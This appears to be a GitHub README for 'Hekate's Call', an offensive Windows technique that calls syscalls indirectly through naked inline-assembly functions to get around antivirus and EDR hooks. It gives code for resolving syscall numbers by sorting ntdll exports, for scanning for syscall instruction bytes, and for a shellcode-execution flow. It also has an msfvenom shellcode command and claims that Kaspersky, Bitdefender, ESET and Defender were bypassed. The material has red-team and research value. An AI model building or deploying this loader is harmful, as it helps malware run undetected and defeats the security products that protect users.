# Hekate's Call
### Dynamic (Indirect-Direct) Syscalls Invocation via Function Pointers
#### Author: Hasbi A. (@3xploitZero)

The research and development of this technique draws heavily on concepts that have already been successfully implemented by other security researchers, such as **FreshyCalls** (@crummie5), **SysWhispers2** (Jackson T. aka @jthuraisamy), **Hell's Gate** (Paul L. aka @am0nsec & vx_underground aka @RtlMateusz), and **Halo's Gate** (Sektor7). Therefore, it represents a novel approach rather than a ground-breaking concept.

This technique utilizes the ```__declspec(naked)``` function to define a custom function that executes inline assembly,  allowing for _**indirect syscall**_. Here's an implementation that demonstrates this approach:

```
__declspec(naked) NTSTATUS __cdecl SysNtWaitForSingleObject(
    HANDLE          Handle,
    BOOLEAN         Alertable,
    PLARGE_INTEGER  Timeout,
    LPBYTE          funcAddr,
    unsigned int    syscallNum,
    LPBYTE          p)
{
    __asm__ __volatile__ (
        "call %[funcAddr]\n"
        "mov eax, %[syscallNum]\n"
        "jmp %[p]"
        :
        : [funcAddr] "r" (funcAddr), [syscallNum] "m" (syscallNum), [p] "m" (p)
    );
}

```
Furthermore, this technique introduces an alternative approach for resolving the ```System Service Number (SSN)``` and the ```syscall``` instruction dynamically, even in cases where one or **all** syscalls are _hooked_. 

Building upon the concept employed by **SysWhispers2**, this method utilizes a function that enables us to proceed by modifying the ```Nt``` letters of our function to ```Zw``` and organizing the functions in accordance with their respective addresses. By assigning the lowest address to syscall number __0x0__, followed by the next lowest address to syscall number __0x1__, and so on, we can successfully associate the functions with their corresponding syscall numbers. Finally, we can revert the ```Zw``` letters of the function back to ```Nt```. 

```
...
for (i = 0; i < exports->NumberOfNames; i++) {

  char* functionName = (char*)(hModuleStart + addressOfNames[i]);
  DWORD functionAddress = (DWORD)(ULONG_PTR)(hModuleStart + addressOfFunctions[addressOfNameOrdinals[i]]);

  functionInfoArray[i].functionName = functionName;
  functionInfoArray[i].functionAddress = functionAddress;
}
...
```
First, we sort the array by function addresses using the ```qsort``` function.
```
qsort(functionInfoArray, exports->NumberOfFunctions, sizeof(FunctionInfo), compareFunctionInfo);
```
Once the array is sorted, we can easily identify the function addresses and their corresponding syscall numbers.
```
...
for (i = 0; i < exports->NumberOfFunctions; i++) {
    if (functionInfoArray[i].functionAddress != 0 && (_strnicmp(functionInfoArray[i].functionName, "Zw", 2) == 0)) {
        if (strcmp(functionInfoArray[i].functionName, input) == 0) {
            inputFound = 1;
            break;
        }
        syscallNumber++;
    }
}
...
```
At this juncture, we have the opportunity to utilize **Halo's Gate** technique by identifying a neighboring syscall number when a specific syscall is _hooked_. However, this technique may be redundant in this particular scenario, given that we have already sorted the function addresses.

To locate the ```syscall``` instruction within the ```ntdll.dll```, we will search for the byte sequence that implements ```syscall``` and ```ret```, which is as follows:
```
...
  while (p < ntdllEnd) {
      if (*p == 0x0f && *(p + 1) == 0x05 && *(p + 2) == 0xC3) {
          found = TRUE;
          DWORD offset = (DWORD)(p - functionAddress);
          break;
      }
      p++;
  }
...
```
If we are unable to locate any ```syscall``` instruction, it means that all the syscalls are already _hooked_. In such a scenario, our approach would be to return the ```sysInstruct``` function. This function is essentially a _**direct syscall**_ that is defined within the ```HekatesCall.asm``` file. So, you can think of it as a fail-safe mechanism that ensures our code runs smoothly even in the absence of any explicit syscall instruction within the  ```ntdll.dll```.

### [!] Cautions

Utilizing the ```__declspec(naked)``` is generally not recommended as it requires manual management of the stack, which makes it more susceptible to errors. Additionally, functions that lack generated _prologue_ and _epilogue_ may not preserve the value of the **RDI** register in different versions or builds of Windows.

#### /* This has been tested on Microsoft Windows 10 Pro (10.0.19044 N/A Build 19044) */

![241519156-1d0e5db7-ac49-4aa8-a276-45a0f136d5a7](https://github.com/hasbiyama/HekatesCall/assets/64126239/7ae2320b-c709-40f1-94ed-b6315e01ade1)

![241519207-0e78c466-3cf3-479e-8b5d-dbccb42211bd](https://github.com/hasbiyama/HekatesCall/assets/64126239/77a4d634-5a86-475d-80f5-488249e95229)

![241493526-384532b6-357a-4cf4-860c-af205e860b2b](https://github.com/hasbiyama/HekatesCall/assets/64126239/c85bfe50-37ec-4ae4-8677-3971a70bc299)

As illustrated above, when the breakpoint at ```SysNtProtectVirtualMemory``` is hit, the **RDI** value is __0x0000029c47000000__ (the address for the allocated shellcode). However, after clicking _Run_ and reaching the breakpoint at ```SysNtCreateThreadEx```, the **RDI** value changes to __0x00007ff8df82e892__ (the address space of the ```.text``` section of ```ntdll.dll```), indicating that there is a function (or several functions) responsible for altering the **RDI** value between ```SysNtProtectVirtualMemory``` and ```SysNtCreateThreadEx```.

Moreover, as the **RDI** value of ```SysNtCreateThreadEx``` does not correspond to the address of the allocated shellcode, the ```HANDLE``` of ```SysNtCreateThreadEx``` is **not** ```NULL```, and as a result, the shellcode will not execute.

Upon conducting a comprehensive debugging session, we unearthed that the ```getSyscallInfo``` function modifies the **RDI** value to contain the syscall number, whereas the ```find0f05c3Sequence``` function alters **RDI** to hold an address present in the address space of the ```.text``` section of ```ntdll.dll```. This behavior is also dependent on the length of the shellcode. If the shellcode length is 'incorrect', the **RAX** value following the syscall instruction for ```SysNtCreateThreadEx``` will result in a return value of __0xC000012D__, which is the __STATUS_COMMITMENT_LIMIT__.

### [+] Solution

As we have identified that before the execution of ```getSyscallInfo```  has been causing disruptions, we will implement a solution by saving the value of **RDI** ```(rdi_value)``` prior to its first execution.

```
...
     __asm__ volatile ("mov %0, %%rdi;" : "=r" (rdi_value));
...
```
Additionally, we will store the value for ```rdi_value_2``` and restore ```rdi_value``` immediately before ```SysNtCreateThreadEx``` is executed. 
```
...
    __asm__ volatile ("mov %%rdi, %0;" : : "r" (rdi_value));
...
```
Once ```SysNtCreateThreadEx``` is executed, it will verify whether the **EAX** register is **0**; if not, the memory will be _zeroed_. Following this, we will restore ```rdi_value_2```.

```
...
    memset(lpMemory, 0, mbi.RegionSize);
....
    __asm__ volatile ("mov %%rdi, %0;" : : "r" (rdi_value_2));    
...
```
#### /* This has been tested on Microsoft Windows 10 Pro (10.0.19044 N/A Build 19044) */

[![solVid](https://i.ibb.co/7yT2frZ/Snapshot.png)](https://www.youtube.com/watch?v=ZEitZXJ6O6Y)

#### [=] Please click the image or the link to start the video (Youtube) - https://youtu.be/ZEitZXJ6O6Y

## POC (Proof of Concept)

### Shellcode
```msfvenom -p windows/x64/exec cmd=calc.exe -f raw > output.bin```

### File Hash
```
HekatesCall.exe

MD5     : e8e9c413f7ccfccf80e4ee99c9b8f69f	
SHA1    : 82be35fefd074ffd5c993a3793b42914187c7e6f	
CRC32   : e32ce8d8	
SHA-256 : c29d9351bd2247c063c71e2c25a6e5636d6e80fb380c6f032c03757768179fb3	
SHA-512 : 1dba6612783617204fb7091203c2b888c432da8a0c7effffaa08580fe03b6d9e2ae7937aa75e18512e2a4f7015158809b0e123aea293e7231d5211a798063aad	
SHA-384 : 829342d9c9a17a8862a204103185e3b30e8a6cf5aca72721abe031f395cefd251313ef90b29866bd196b3f81093d2a0d
```
### Windows Version

#### The code has been tested on

* Microsoft Windows 7 Ultimate (6.1.7601 Service Pack 1 Build 7601)
* Microsoft Windows 10 Pro (10.0.19044 N/A Build 19044)
* Microsoft Windows 10 Enterprise Evaluation (10.0.17763 N/A Build 17763)
* Microsoft Windows 10 Pro for Workstations (10.0.19044 N/A build 19044)
* Microsoft Windows 11 Pro N (10.0.22621 N/A Build 22621)

### AVs / Anti-Malware

#### This has been tested on 
```
Microsoft Windows 10 Enterprise Evaluation (10.0.17763 N/A Build 17763)
Microsoft Windows 11 Pro N (10.0.22621 N/A Build 22621)
```
* Kaspersky Total Security (latest update, 28 May 2023) - https://youtu.be/VErsmb1zDcA ✔️ (bypassed)
* Bitdefender Total Security (latest update, 28 May 2023) - https://youtu.be/_y_bbsuNJGM ✔️ (bypassed)
* ESET Smart Security Premium (latest update, 28 May 2023) - https://youtu.be/dSSEakBHJAQ ✔️ (bypassed)
* Windows Defender (Windows 10) (latest update, 28 May 2023) - https://youtu.be/rEiluNxLD58 ✔️ (bypassed)
* Windows Defender (Windows 11) (latest update, 28 May 2023) - https://youtu.be/jVKtIku4p_8 ✔️ (bypassed)

## References

```
1) https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/ 
2) https://securitycafe.ro/2015/12/14/introduction-to-windows-shellcode-development-part-2/
3) https://gcc.gnu.org/onlinedocs/gcc/extensions-to-the-c-language-family/how-to-use-inline-assembly-language-in-c-code.html
4) https://en.wikibooks.org/wiki/X86_Assembly/NASM_Syntax
5) https://docwiki.embarcadero.com/RADStudio/Alexandria/en/Declspec
6) https://learn.microsoft.com/en-us/windows/win32/api/
```
## Further Reading

```
1) https://github.com/am0nsec/HellsGate (@am0nsec & @vxunderground)
2) https://github.com/crummie5/FreshyCalls (@crummie5)
3) https://github.com/jthuraisamy/SysWhispers2 (@jthuraisamy)
4) https://blog.sektor7.net/#!res/2021/halosgate.md (@SEKTOR7net)
5) https://github.com/boku7/AsmHalosGate (@boku7) 
```
